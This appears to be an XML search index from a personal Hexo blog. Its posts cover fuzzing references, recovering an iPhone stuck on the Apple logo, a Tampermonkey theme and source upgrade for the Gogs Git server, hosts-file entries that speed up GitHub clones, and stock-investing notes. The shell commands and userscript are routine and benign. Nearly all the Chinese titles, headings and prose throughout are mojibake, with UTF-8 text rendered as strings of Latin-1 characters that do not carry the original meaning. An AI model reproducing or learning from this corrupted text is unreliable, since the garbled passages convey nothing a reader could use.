<code>libprotobuf-mutator-libfuzzer.a</code></p><h2 id="å‚è€ƒèµ„æ–™"><a href="#å‚è€ƒèµ„æ–™" class="headerlink" title="å‚è€ƒèµ„æ–™"></a>å‚è€ƒèµ„æ–™</h2><p><a href="https://developers.google.com/protocol-buffers/docs/cpptutorial">https://developers.google.com/protocol-buffers/docs/cpptutorial</a><br><a href="https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md">https://github.com/google/fuzzing/blob/master/docs/structure-aware-fuzzing.md</a><br><a href="https://github.com/google/libprotobuf-mutator/">https://github.com/google/libprotobuf-mutator/</a><br><a href="https://llvm.org/docs/LibFuzzer.html">https://llvm.org/docs/LibFuzzer.html</a><br><a href="https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning">https://github.com/bruce30262/libprotobuf-mutator_fuzzing_learning</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Security</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iPhone å†…å­˜æ»¡äº†, ç™½è‹¹æœé—®é¢˜è§£å†³æ–¹æ³•</title>
    <link href="/cn/iPhone_white_apple/"/>
    <url>/cn/iPhone_white_apple/</url>
    
    <content type="html"><![CDATA[<p>ä¸Šå‘¨åª³å¦‡çš„ iPhone æç¤ºå†…å­˜æ»¡äº†ï¼Œé‡å¯åå°±è¿›å…¥ç™½è‹¹æœçŠ¶æ€ã€‚å®‰è£… itunes ä»¥æ›´æ–°çš„æ–¹å¼é‡åˆ·ç³»ç»Ÿåæ¢å¤æ­£å¸¸ ï¼ˆå¦‚æœé€‰æ‹©æ¢å¤æ¨¡å¼åˆ™ä¼šä¸¢å¤±æ•°æ®ï¼‰ã€‚<br>åˆ·ç³»ç»Ÿçš„æ—¶å€™ä¸€åº¦é‡ä¸Š 14 é”™è¯¯ï¼Œé‡æ–°ä½¿ç”¨æ›´æ–°ç³»ç»Ÿçš„æ–¹å¼å†åˆ·äº†ä¸€éåï¼Œé¡ºåˆ©é€šè¿‡ ï¼ˆè¿æ°”ä¸é”™ï¼‰ã€‚é¡ºåˆ©ç™»å½• iPhone åé©¬ä¸Šåˆ é™¤å„ç§ Appï¼Œæ¸…ç†åå°é©»ç•™çš„ç¨‹åºï¼Œåœ¨æ­¤ä¹Ÿæç¤ºå¤§å®¶ iPhone æ‰‹æœºä¹Ÿæ˜¯è¦å®šæœŸç»´æŠ¤å•Šã€‚</p><p>è¯´èµ·æ¥å°±ä¸Šé¢å‡ å¥è¯ï¼Œå®é™…æ“ä½œèµ·æ¥æ¯”è¾ƒéº»çƒ¦ï¼Œå¤§æ¦‚å¼„äº†ä¸€ä¸ªæ—©ä¸Šï¼ŒæŠŠå‡ ä¸ªè¦ç‚¹æ€»ç»“ä¸€ä¸‹ã€‚</p><h2 id="å¼ºåˆ¶é‡æ–°å¯åŠ¨-iPhone"><a href="#å¼ºåˆ¶é‡æ–°å¯åŠ¨-iPhone" class="headerlink" title="å¼ºåˆ¶é‡æ–°å¯åŠ¨ iPhone"></a>å¼ºåˆ¶é‡æ–°å¯åŠ¨ iPhone</h2><p>å…¶å®åœ¨åˆ·æœºå‰æˆ‘å°è¯•äº†å¼ºåˆ¶é‡å¯ iPhoneï¼Œå¼ºåˆ¶é‡å¯ iPhone çš„æ–¹æ³•å¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥ï¼š<br><a href="https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios">https://support.apple.com/zh-cn/guide/iphone/iph8903c3ee6/ios</a></p><p>æ–°ç‰ˆ iPhone å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">å¼ºåˆ¶é‡æ–°å¯åŠ¨é…å¤‡é¢å®¹ ID çš„ iPhone<br><br>è‹¥è¦å¼ºåˆ¶é‡æ–°å¯åŠ¨ iPhone Xã€iPhone XSã€iPhone XRã€iPhone 11ã€iPhone<span class="hljs-number"> 12 </span>æˆ– iPhone 13ï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š<br><br>æŒ‰ä¸‹å¹¶å¿«é€Ÿæ¾å¼€è°ƒé«˜éŸ³é‡æŒ‰é’®ï¼ŒæŒ‰ä¸‹å¹¶å¿«é€Ÿæ¾å¼€è°ƒä½éŸ³é‡æŒ‰é’®ï¼Œç„¶åæŒ‰ä½ä¾§è¾¹æŒ‰é’®ã€‚å½“ Apple æ ‡å¿—å‡ºç°æ—¶ï¼Œæ¾å¼€æŒ‰é’®ã€‚<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯å¼ºåˆ¶é‡å¯ iPhone å¹¶æ²¡æœ‰æˆåŠŸï¼Œæ‰‹æœºä¾ç„¶å¤„äºç™½è‹¹æœçŠ¶æ€æ²¡æœ‰å“åº”ã€‚</p><h2 id="è¿›å…¥-DFU-æ¨¡å¼"><a href="#è¿›å…¥-DFU-æ¨¡å¼" class="headerlink" title="è¿›å…¥ DFU æ¨¡å¼"></a>è¿›å…¥ DFU æ¨¡å¼</h2><p>ä¸è¿›å…¥ DFU æ¨¡å¼æ— æ³•åˆ·æœºï¼ŒiPhone ä¸åŒæœºå‹è¿›å…¥ DFU æ¨¡å¼çš„æ–¹æ³•ä¸ç›¸åŒï¼Œå…·ä½“çš„å¯ä»¥å‚è€ƒä¸‹é¢é“¾æ¥ï¼š<br><a href="https://support.apple.com/en-us/HT201263">https://support.apple.com/en-us/HT201263</a></p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">iPhone <span class="hljs-number">8</span> <span class="hljs-keyword">or </span>later: Press <span class="hljs-keyword">and </span>quickly release the Volume Up <span class="hljs-keyword">button. </span><br>Press <span class="hljs-keyword">and </span>quickly release the Volume Down <span class="hljs-keyword">button. </span><br>Then, press <span class="hljs-keyword">and </span>hold the Side <span class="hljs-keyword">button </span>until you see the recovery mode <span class="hljs-keyword">screen.</span><br></code></pre></td></tr></table></figure><h2 id="å®‰è£…-itunes-åˆ·æœº"><a href="#å®‰è£…-itunes-åˆ·æœº" class="headerlink" title="å®‰è£… itunes åˆ·æœº"></a>å®‰è£… itunes åˆ·æœº</h2><p>å®‰è£… itunes çš„è¿‡ç¨‹å°±ä¸åœ¨ç»†è¯´äº†ï¼Œæ­£å¸¸å®‰è£…å³å¯ã€‚æ›´æ–°è¿‡ç¨‹éœ€è¦æ³¨æ„ä¸­é—´æŸä¸ªæ­¥éª¤å¯èƒ½è€—æ—¶å¾ˆé•¿ï¼Œä¸è¦ç€æ€¥å¾—æ…¢æ…¢ç­‰ï¼ŒApple è¿˜ä¸“é—¨æœ‰é“¾æ¥è¯´æ˜è¿™ä¸ªé—®é¢˜ã€‚<br><a href="https://support.apple.com/zh-cn/HT203435">https://support.apple.com/zh-cn/HT203435</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs">å‡ºç°è¿™ç§æƒ…å†µåï¼Œè¿›åº¦æ¡å¯èƒ½ç§»åŠ¨éå¸¸ç¼“æ…¢æˆ–ä¼¼ä¹ä¸ç§»åŠ¨ã€‚<br><br>è¯·ç­‰å¾…è®¾å¤‡å®Œæˆæ›´æ–°ã€æ¢å¤æˆ–æŠ¹æ‰è¿‡ç¨‹ã€‚<br><br>è¿›åº¦æ¡ä¼šæ˜¾ç¤ºå®‰è£…è¿›åº¦ã€‚æ‰€ç”¨æ—¶é—´å–å†³äºè®¾å¤‡ä¸Šçš„æ–‡ä»¶æ•°é‡ï¼Œä»¥åŠæ‚¨æ˜¯è¦æŠ¹æ‰ã€æ›´æ–°è¿˜æ˜¯å‡çº§ iOS æˆ– iPadOSã€‚<br>å¦‚æœè®¾å¤‡ä¸Šåªæœ‰å¾ˆå°‘æ•°æ®æˆ–æ²¡æœ‰æ•°æ®ï¼Œæˆ–è€…å¦‚æœæ‚¨è¦æŠ¹æ‰è®¾å¤‡ä¸Šçš„æ•°æ®ï¼Œè¿™ä¸ªè¿‡ç¨‹å¯èƒ½åªéœ€ä¸€åˆ†é’Ÿæ—¶é—´ã€‚<br>å¦‚æœè®¾å¤‡åŒ…å«å¤§é‡æ–‡ä»¶ï¼Œåˆ™è¿™ä¸ªè¿‡ç¨‹å¯èƒ½éœ€è¦æ•°åˆ†é’Ÿè‡³ä¸€å°æ—¶ä¸ç­‰ã€‚<br></code></pre></td></tr></table></figure><p>åˆ·æœºè¿‡ç¨‹ä¸­å¤§æ¦‚ç‡ä¼šé‡ä¸Š 14 é”™è¯¯ï¼Œç½‘ç»œä¸Šè¯´æ³•å¾ˆå¤šå¤§æ¦‚å°±ä¸¤ç‚¹ã€‚</p><ul><li>ï¼ˆ1ï¼‰æŒ‘çº¿ï¼Œè¦ä¿è¯ USB æ•°æ®çº¿æœ‰æ•ˆï¼Œä¼˜å…ˆä½¿ç”¨ USB 2.0</li><li>ï¼ˆ2ï¼‰å¤šåˆ·å‡ æ¬¡ï¼Œåå¤åˆ·</li></ul><p>æˆ‘è¿™æ¬¡è¿æ°”ä¸é”™ï¼Œé‡ä¸Š 14 é”™è¯¯åï¼Œæ¢äº†ä¸ª USB 2.0 çš„å£é‡åˆ·ä¸€æ¬¡å°±è¿‡äº†ï¼Œç¥å¤§å®¶å¥½è¿ã€‚</p><p>é‡å¯åéœ€è¦è¾“å…¥å¯†ç ï¼Œæç¤ºå°è¯•æ¢å¤æ•°æ®ï¼Œè¿›åº¦è·‘å®Œå°±å¤§åŠŸå‘Šæˆäº†ã€‚</p><h2 id="äº‹åçš„æ¸…ç†å·¥ä½œ"><a href="#äº‹åçš„æ¸…ç†å·¥ä½œ" class="headerlink" title="äº‹åçš„æ¸…ç†å·¥ä½œ"></a>äº‹åçš„æ¸…ç†å·¥ä½œ</h2><p>æ¢å¤å®Œæ•°æ®ï¼Œç™»å½•åª³å¦‡çš„æ‰‹æœºå‘ç°ä»¥ä¸‹å‡ ç‚¹é—®é¢˜ï¼š</p><ul><li>ï¼ˆ1ï¼‰ æ‰‹æœºå­˜å‚¨ç©ºé—´ç´§å¼ </li><li>ï¼ˆ2ï¼‰ åå°é©»ç•™çš„ç¨‹åºæ¯”è¾ƒå¤š</li></ul><p>å¯¼è‡´ç™½è‹¹æœçš„åŸå› æœªçŸ¥ï¼Œå°†è¿™äº›é—®é¢˜è§£å†³äº†ä¸€ä¸‹ï¼Œå¸Œæœ›èƒ½æ­£å¸¸ä½¿ç”¨äº†ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Life</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gogs çš®è‚¤å’Œæºç å‡çº§</title>
    <link href="/cn/gogs/"/>
    <url>/cn/gogs/</url>
    
    <content type="html"><![CDATA[<p>gogs ä½¿ç”¨äº†ä¹Ÿæœ‰ä¸€å¹´å¤šäº†ï¼Œå°å›¢é˜Ÿä½¿ç”¨åŸºæœ¬è¿˜è¡Œã€‚æœ‰å‡ ä¸ªé—®é¢˜ï¼Œç¬¬ä¸€ç•Œé¢ä»£ç  merge æœ‰é—®é¢˜ï¼Œç¬¬äºŒä¸æ”¯æŒä»£ç  reviewï¼Œ<br>å¦‚æœèƒ½è§£å†³ä¸Šé¢ä¸¤ä¸ªé—®é¢˜å°±å¥½ç”¨å¾ˆå¤šäº†ã€‚ä¸‹é¢ä¸¤æ®µæ˜¯å¹´å‰æŠ˜è…¾ gogs çš„è®°å½•ï¼Œæ²¡æœ‰å•¥æŠ€æœ¯å«é‡ï¼Œåªæ˜¯åšä¸ªå¤‡ä»½ã€‚</p><h2 id="åˆ‡æ¢çš®è‚¤"><a href="#åˆ‡æ¢çš®è‚¤" class="headerlink" title="åˆ‡æ¢çš®è‚¤"></a>åˆ‡æ¢çš®è‚¤</h2><p><a href="https://github.com/Kos-M/GogsThemes">https://github.com/Kos-M/GogsThemes</a> æä¾›äº†ä¸¤æ¬¾çš®è‚¤ï¼Œæ–‡ä¸­ç»™å‡ºçš„æ–¹æ³•è¦ä¿®æ”¹ gogs é…ç½®ï¼Œç›´æ¥ä½¿ç”¨ TamperMonkey å°±å¯ä»¥äº†ã€‚</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-comment">// ==UserScript==</span><br><span class="hljs-comment">// @name         Gogs Theme</span><br><span class="hljs-comment">// @resource     IMPORTED_CSS https://raw.githubusercontent.com/Kos-M/GogsThemes/master/themes/dark_theme.css</span><br><span class="hljs-comment">// @namespace    http://tampermonkey.net/</span><br><span class="hljs-comment">// @version      0.1</span><br><span class="hljs-comment">// @description  try to take over the world!</span><br><span class="hljs-comment">// @author       You</span><br><span class="hljs-comment">// @match        http://website:8000/*</span><br><span class="hljs-comment">// @grant        GM_getResourceText</span><br><span class="hljs-comment">// @grant        GM_addStyle</span><br><span class="hljs-comment">// ==/UserScript==</span><br><br>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-string">&#x27;use strict&#x27;</span>;<br>    <span class="hljs-keyword">const</span> my_css = <span class="hljs-title function_">GM_getResourceText</span>(<span class="hljs-string">&quot;IMPORTED_CSS&quot;</span>);<br>    <span class="hljs-title function_">GM_addStyle</span>(my_css);<br>&#125;)();<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨åæ•ˆæœå›¾</p><p><img src="https://github.com/henices/pictures/raw/master/gogs0.png"></p><h2 id="æºç å‡çº§"><a href="#æºç å‡çº§" class="headerlink" title="æºç å‡çº§"></a>æºç å‡çº§</h2><p>gogs å·²ç»æœ‰ä¸€å¹´å¤šæ²¡æœ‰æä¾›äºŒè¿›åˆ¶çš„å®‰è£…åŒ…äº†ï¼Œçœ‹äº†æ”¹è¿›ä¸å°‘ï¼Œå°±å°è¯•äº†æºç å‡çº§ã€‚<br>å‚è€ƒ <a href="https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85">https://gogs.io/docs/installation/install_from_source#%E6%B5%8B%E8%AF%95%E5%AE%89%E8%A3%85</a></p><h3 id="å®‰è£…-golang"><a href="#å®‰è£…-golang" class="headerlink" title="å®‰è£… golang"></a>å®‰è£… golang</h3><p>å‚è€ƒ Google å®˜æ–¹æ–‡æ¡£ï¼Œæ‰§è¡Œä¸‹é¢å‘½ä»¤å°±å¯ä»¥äº†ã€‚ <a href="https://go.dev/doc/install">https://go.dev/doc/install</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget https://go.dev/dl/go1.17.6.linux-amd64.tar.gz<br><span class="hljs-built_in">rm</span> -rf /usr/local/go &amp;&amp; tar -C /usr/local -xzf go1.17.6.linux-amd64.tar.gz<br><span class="hljs-built_in">export</span> PATH=<span class="hljs-variable">$PATH</span>:/usr/local/go/bin<br></code></pre></td></tr></table></figure><h3 id="ç¼–è¯‘"><a href="#ç¼–è¯‘" class="headerlink" title="ç¼–è¯‘"></a>ç¼–è¯‘</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># å…‹éš†ä»“åº“åˆ° &quot;gogs&quot; å­ç›®å½•</span><br>git <span class="hljs-built_in">clone</span> --depth 1 https://github.com/gogs/gogs.git gogs<br><span class="hljs-comment"># ä¿®æ”¹å·¥ä½œç›®å½•</span><br><span class="hljs-built_in">cd</span> gogs<br><span class="hljs-comment"># ç¼–è¯‘ä¸»ç¨‹åºï¼Œè¿™ä¸ªæ­¥éª¤ä¼šä¸‹è½½æ‰€æœ‰ä¾èµ–</span><br>go build -o gogs<br></code></pre></td></tr></table></figure><p>ç¼–è¯‘è¿‡ç¨‹ä¼šä¸‹è½½æ–‡ä»¶ï¼ˆéœ€è¦è‡ªå¤‡æ¢¯å­ï¼‰ï¼Œç¼–è¯‘å®Œæˆåå°†åœ¨ gogs å·¥ä½œç›®ä¸‹ç”Ÿæˆ gogs å¯æ‰§è¡Œæ–‡ä»¶</p><h3 id="æ‰“åŒ…"><a href="#æ‰“åŒ…" class="headerlink" title="æ‰“åŒ…"></a>æ‰“åŒ…</h3><p>gogs æºç çš„ Makefile æä¾›äº†æ‰“åŒ…å‘½ä»¤ï¼Œæ‰§è¡Œ <code>make pack</code> å³å¯ï¼Œå°†åœ¨ release ç›®ç”Ÿæˆ <code>gogs.20220112095054.zip</code></p><h3 id="è¿ç§»é…ç½®"><a href="#è¿ç§»é…ç½®" class="headerlink" title="è¿ç§»é…ç½®"></a>è¿ç§»é…ç½®</h3><p>å°† gogs.20220112095054.zip è§£å‹ï¼Œè¿™å°±ç±»ä¼¼ gogs çš„äºŒè¿›åˆ¶å‡çº§äº† <a href="https://gogs.io/docs/upgrade/upgrade_from_binary">https://gogs.io/docs/upgrade/upgrade_from_binary</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">mv</span> gogs gogs_old<br><span class="hljs-built_in">cp</span> -R gogs_old/custom gogs<br><span class="hljs-built_in">cp</span> -R gogs_old/data gogs<br><span class="hljs-built_in">cp</span> -R gogs_old/log gogs<br></code></pre></td></tr></table></figure><p>gogs 0.13 çš„é…ç½®å·²ç»å‘ç”Ÿäº†å˜åŒ–ï¼Œå¦‚æœä¸ä¿®æ”¹é…ç½®æ‰§è¡Œ <code>./gogs web</code>ä¼šå‡ºç°é”™è¯¯</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">2022/01/12 09:40:06 [ <span class="hljs-built_in">INFO</span>] Gogs 0.13.0+dev<br>2022/01/12 09:40:06 [FATAL] [<span class="hljs-built_in">..</span>.github/internal/route/install.go:75 GlobalInit()] Failed <span class="hljs-keyword">to</span> initialize ORM engine:<br>open database: failed <span class="hljs-keyword">to</span> connect <span class="hljs-keyword">to</span> `<span class="hljs-attribute">host</span>=127.0.0.1 <span class="hljs-attribute">user</span>=root <span class="hljs-attribute">database</span>=gogs`: dial <span class="hljs-built_in">error</span> (dial tcp 127.0.0.1:3306: connect:<span class="hljs-built_in"> connection </span>refused)<br></code></pre></td></tr></table></figure><p>çœ‹é”™è¯¯åƒæ˜¯åœ¨è¿æ¥ mysql çš„ 3306 ç«¯å£ï¼Œå¯æ˜¯é…ç½®æ–‡ä»¶è®¾ç½®çš„æ˜¯ä½¿ç”¨ sqliteï¼Œéå¸¸å›°æƒ‘ã€‚ä¸Šç½‘æœç´¢åè¯å®æ˜¯ gogs 0.13 çš„é…ç½®æ–‡ä»¶çš„å­—æ®µä¿®æ”¹äº†ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/gogs1.png"></p><p>æœ€å…³é”®çš„ä¸¤ä¸ªå­—æ®µæ˜¯æ•°æ®åº“ç›¸å…³çš„ <code>DB_TYPE</code> æ”¹ä¸º <code>TYPE</code>ï¼Œ <code>PASSWD</code> æ”¹ä¸º <code>PASSWORD</code> ä¿®æ”¹å <code>custom/conf/app.ini</code> åï¼Œæ‰§è¡Œ <code>./gogs web</code> ä¸€åˆ‡æ­£å¸¸ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>github clone åŠ é€Ÿ</title>
    <link href="/cn/github_speed_up/"/>
    <url>/cn/github_speed_up/</url>
    
    <content type="html"><![CDATA[<p>å›½å†…å› ä¸ºä¼—æ‰€å‘¨çŸ¥çš„åŸå› ï¼Œgit clone ä¸€ç›´å¾ˆæ…¢ï¼Œæœ€è¿‘å¯èƒ½çŠ¶å†µå°±æ›´ç³Ÿç³•äº†ã€‚@TeleMan æä¾›äº†ä¸€ä¸ªä¿¡æ¯ï¼Œå¯ä»¥<br>é€šè¿‡ä¿®æ”¹ host æ–‡ä»¶è¾¾åˆ°åŠ é€Ÿæ•ˆæœã€‚ç»è¿‡æµ‹è¯•ï¼Œåªè¦ä¿®æ”¹ä¸¤æ¡è®°å½•å³å¯</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">199.232.69.194</span>                github.global.ssl.fastly.net<br><span class="hljs-number">140.82.113.4</span>                  github.com<br></code></pre></td></tr></table></figure><p>ä¿®æ”¹åï¼Œé€Ÿåº¦å¿«å¤šäº†ï¼Œç›´è¿</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/googleprojectzero/winafl.git<br>æ­£å…‹éš†åˆ° <span class="hljs-string">&#x27;winafl&#x27;</span>...<br>remote: Enumerating objects: 1538, <span class="hljs-keyword">done</span>.<br>remote: Counting objects: 100% (175/175), <span class="hljs-keyword">done</span>.<br>remote: Compressing objects: 100% (108/108), <span class="hljs-keyword">done</span>.<br>remote: Total 1538 (delta 90), reused 130 (delta 60), pack-reused 1363<br>æ¥æ”¶å¯¹è±¡ä¸­: 100% (1538/1538), 5.29 MiB | 765.00 KiB/s, å®Œæˆ.<br>å¤„ç† delta ä¸­: 100% (846/846), å®Œæˆ.<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ä¸€æ®µæ—¶é—´åå‘ç°ä¸æ˜¯å¤ªç¨³å®šï¼Œç»ˆæå¤§æ³•è¿˜æ˜¯éœ€è¦ä¸€ä¸ªé•¿é•¿çš„æ¢¯å­ï¼Œæ­¤æ–¹æ³•è®°ä¸ºå¤‡ç”¨æ–¹æ¡ˆã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>Programming</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>é«˜æ•ˆå¤ç›˜æŠ€å·§</title>
    <link href="/cn/fupangjiqiao/"/>
    <url>/cn/fupangjiqiao/</url>
    
    <content type="html"><![CDATA[<p>å‰äº›å¹´æ€»ç»“çš„ï¼Œç°åœ¨çœ‹èµ·æ¥ï¼Œè¿‡äºå¤æ‚äº†ï¼Œå¯èƒ½åšçŸ­çº¿çš„ä¼šæœ‰éœ€æ±‚ã€‚</p><p><img src="https://github.com/henices/pictures/raw/master/webwxgetmsgimg.jpeg" alt="image"></p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>åŸºæœ¬é¢éœ€è¦å…³æ³¨çš„ç‚¹</title>
    <link href="/cn/fundamental/"/>
    <url>/cn/fundamental/</url>
    
    <content type="html"><![CDATA[<p>å‡†å¤‡å¤šå†™ç‚¹ä¸œè¥¿ï¼Œå†…å®¹å°†ä¸åœ¨å±€é™äºç½‘ç»œå®‰å…¨ã€‚</p><p>ä¸å¾—ä¸è¯´æé‡‘èçš„è¿™äº›äººå¾ˆå‰å®³ï¼Œå„ç§ç©æ³•å‘æ­»å¤§å®¶äº†ã€‚<br>é™¤äº†ä¸€èˆ¬éœ€è¦å…³æ³¨çš„ç‚¹ï¼Œè¿˜éœ€è¦å…³æ³¨å‡ ä¸ªåœ°æ–¹ï¼Œå…¶å®è¿™äº›ç‚¹åœ¨æŸäº›æƒ…å†µä¸‹æ¯”PEï¼ŒROE å•¥çš„éƒ½é‡è¦ï¼š</p><ul><li>å¯è½¬å€º ï¼ˆä¸€å †å®¶ä¼™å–œæ¬¢å¥—åˆ©ï¼‰</li><li>é…è‚¡   ï¼ˆæ•£æˆ·ä¸å¤ªå–œæ¬¢é…è‚¡ï¼‰</li><li>èèµ„ç›˜ ï¼ˆä¸»åŠ›ä¸å–œæ¬¢å¤ªå¤šäººåšè½¿å­ï¼‰</li><li>å¢å‘   ï¼ˆè¿™ä¸ªæƒ…å†µæ¯”è¾ƒå¤æ‚ï¼Œå¢å‘ä»·æ˜¯æ¯”è¾ƒé‡è¦çš„ï¼‰</li><li>è´¨æŠ¼   ï¼ˆå¤ªé«˜å¯èƒ½æš´é›·ï¼‰</li><li>GDR   ï¼ˆè¿˜æ˜¯å¥—åˆ©ï¼‰</li><li>å•†èª‰   ï¼ˆå¯èƒ½è¦è®¡æï¼Œå½±å“å‡€åˆ©æ¶¦ï¼‰</li><li>å‡æŒ   ï¼ˆä¸»åŠ›ä¸å–œæ¬¢ç»™å¤§è‚¡ä¸œæŠ¬è½¿å­)</li></ul><p>è¦äº†è§£è¿™äº›æƒ…å†µæœ€å¯é çš„æ–¹æ³•ä¸ºè¯»å…¬å‘Šï¼Œä¸€èˆ¬æƒ…å†µé›ªçƒå’Œä¸œæ–¹è´¢å¯Œè‚¡å§ä¼šæœ‰äººè®¨è®ºã€‚</p><p><a href="https://xueqiu.com/">https://xueqiu.com/</a><br><a href="http://guba.eastmoney.com/">http://guba.eastmoney.com/</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>investment</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ã€è½¬ã€‘å†¯æŸ³æŠ•èµ„åå¤§é‡‘å¥</title>
    <link href="/cn/fengliu/"/>
    <url>/cn/fengliu/</url>
    
    <content type="html"><![CDATA[<p>ï¼ˆä¸€ï¼‰ç»æµçš„æ³¢åŠ¨å°±åƒæ˜¯å‰ªç¾Šæ¯›ï¼Œé•¿å¥½äº†å°±å‰ªã€å‰ªå®Œäº†å†é•¿ã€‚æ‹¿å‰ªå­çš„ä¸€èˆ¬å°±æ˜¯èµ¢å®¶ï¼Œå½“ç„¶èµ¢å®¶ä¹‹é—´ä¹Ÿæœ‰äº’ç›¸å‰ªçš„ï¼Œæ‰€ä»¥å°±æœ‰å¤§å°èµ¢å®¶ã€é•¿çŸ­èµ¢å®¶ä¹‹åˆ†ã€‚</p><p>ï¼ˆäºŒï¼‰æŠ€æœ¯åˆ†æä¸»è¦æ˜¯æ‰¾å‡ºè¶‹åŠ¿å’Œé¢„æœŸåŒå‘è¿åŠ¨å¹¶å¼ºåŒ–çš„æœºä¼šï¼Œä»·å€¼åˆ†æåˆ™å¯ä»¥åœ¨åå‘è¿åŠ¨ä½†æœ€ç»ˆä¼šè¢«é¢„æœŸæ”¹å˜çš„æœºä¼šä¸Šä¸‹æ³¨ã€‚</p><p>ï¼ˆä¸‰ï¼‰å„æ–¹é¢éƒ½å®Œç¾çš„ç³»ç»Ÿæ˜¯ä¸å¯èƒ½é•¿æœŸå­˜åœ¨çš„ï¼Œæ”¾å¼ƒæ•ˆç‡å’ŒçŸ­æœŸå®‰å…¨çš„ç³»ç»Ÿå¾€å¾€æ‰ä¼šæ˜¯é•¿æœŸå®‰å…¨å’Œå¯é‡å¤çš„ã€‚è¿™ä¸å¤ªç¬¦åˆäººæ€§ï¼Œä¹Ÿå°±ä¿è¯äº†ç³»ç»Ÿçš„ç‹¬ç‰¹å’Œæœ‰æ•ˆæ€§ï¼Œä¹Ÿæœ‰åˆ©äºå°†ç²¾åŠ›æ”¾åœ¨é•¿æœŸè¦ç´ å’Œæˆ˜ç•¥ç‚¹çš„æ€è€ƒä¸Šã€‚</p><p>ï¼ˆå››ï¼‰æ¶¨è·Œéƒ½èƒ½ä»¤äººåšå®šçš„æ‰æ˜¯å¥½æ ‡çš„ï¼Œè·Œä»¤å®çš„æ›´å®ï¼Œå› ä¸ºä»·é’±ä¾¿å®œäº†ã€‚æ¶¨ä»¤è™šå¤„æ˜¾å¾—ç¡®å®šï¼Œå› ä¸ºå¾—åˆ°å¸‚åœºçš„ç¡®è®¤å’Œä½è¯äº†ã€‚è¿™å°±æ˜¯è™šå®ç»“åˆå¸¦æ¥çš„æ•ˆæœï¼Œå¦‚æœæ¶¨å‡ åä¸ªç‚¹å°±è®©äººæœ‰æƒ³å–çš„æ„Ÿè§‰ï¼Œé‚£å°±è¯´æ˜è™šå¤„ä¸è¶³ï¼Œå°±ä¸å¤ªå¯èƒ½æ˜¯å¥½é€‰æ‹©ï¼Œæœ€åä¹Ÿè®¸è¿é‚£å‡ åä¸ªç‚¹ä¹Ÿä¸å®¹æ˜“æŒ£åˆ°ã€‚åè¿‡æ¥ä¹Ÿæ˜¯ä¸€æ ·ï¼Œè·Œäº†ä¸æ•¢é‡ä»“åŠ 